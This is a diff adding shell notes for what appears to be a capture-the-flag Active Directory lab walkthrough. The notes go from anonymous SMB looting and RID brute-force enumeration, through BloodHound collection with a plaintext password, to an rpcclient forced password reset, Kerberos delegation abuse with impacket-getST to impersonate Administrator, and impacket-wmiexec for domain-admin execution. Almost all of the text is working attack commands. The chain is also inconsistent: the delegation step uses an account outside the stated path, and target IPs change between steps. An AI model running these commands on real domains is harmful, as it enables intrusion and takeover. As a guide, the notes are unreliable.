@@ -1,0 +1,96 @@
+#############################################
+# 1️⃣ Hostname Setup
+#############################################
+
+# Add the target to /etc/hosts for resolution
+vim /etc/hosts
+# HayStack.thm.corp HayStack
+
+
+#############################################
+# 2️⃣ Initial SMB Enumeration
+#############################################
+
+# List SMB shares anonymously
+smbclient -L //10.10.130.147 -N
+
+# Connect to the 'Data' share anonymously
+smbclient //10.10.130.147/Data -N
+
+# Enable recursive download mode
+prompt OFF
+recurse ON
+
+# Navigate to onboarding directory and download all files
+cd 'onboarding'
+mget *
+
+
+#############################################
+# 3️⃣ RID Brute-Force for User Enumeration
+#############################################
+
+# Enumerate users via RID brute force
+nxc smb t1 -u 'anonymous' -p '' --rid-brute > rid_users.txt
+
+# Clean usernames and save to file
+cat rid_users.txt | awk '{print $6}' | sed 's/^THM\\//' > clean_users.txt
+
+
+#############################################
+# 4️⃣ Authenticated BloodHound Enumeration
+#############################################
+
+# Use valid creds for full domain enumeration
+sudo bloodhound-python \
+  -u TABATHA_BRITT \
+  -p 'marlboro(1985)' \
+  -d thm.corp \
+  -dc HayStack.thm.corp \
+  -c all 
+
+# Upload BloodHound data for analysis
+./bloodhound_cli up
+
+
+#############################################
+# 5️⃣ Privilege Escalation Path (Found via BH)
+#############################################
+
+# Path:
+# TABATHA_BRITT 
+#   └── GenericAll over USER_A
+#         └── ForceChangePassword on USER_B
+#               └── Owns USER_C
+#                     └── AllowedToDelegate to DOMAIN
+
+
+#############################################
+# 6️⃣ Abuse GenericAll → ForceChangePassword
+#############################################
+
+# Change USER_A password without knowing the old one
+rpcclient -U 'THM.CORP\TABATHA_BRITT%marlboro(1985)' 10.10.152.178 \
+  -c 'setuserinfo2 USER_A 23 "NewPass123!"'
+
+# Verify new credentials
+nxc smb 10.10.152.178 -u USER_A -p 'NewPass123!'
+
+
+#############################################
+# 7️⃣ Abuse Delegation to Get DA TGT
+#############################################
+
+# Request a service ticket as Administrator via impersonation
+impacket-getST thm.corp/DARLA_WINTERS:'NewPass123!' \
+  -spn cifs/HayStack.thm.corp \
+  -impersonate Administrator \
+  -dc-ip 10.10.152.178
+
+
+#############################################
+# 8️⃣ DA Access via WMI Exec
+#############################################
+
+# Execute commands as Administrator with Kerberos ticket
+impacket-wmiexec -k -no-pass THM.CORP/Administrator@HayStack.thm.corp
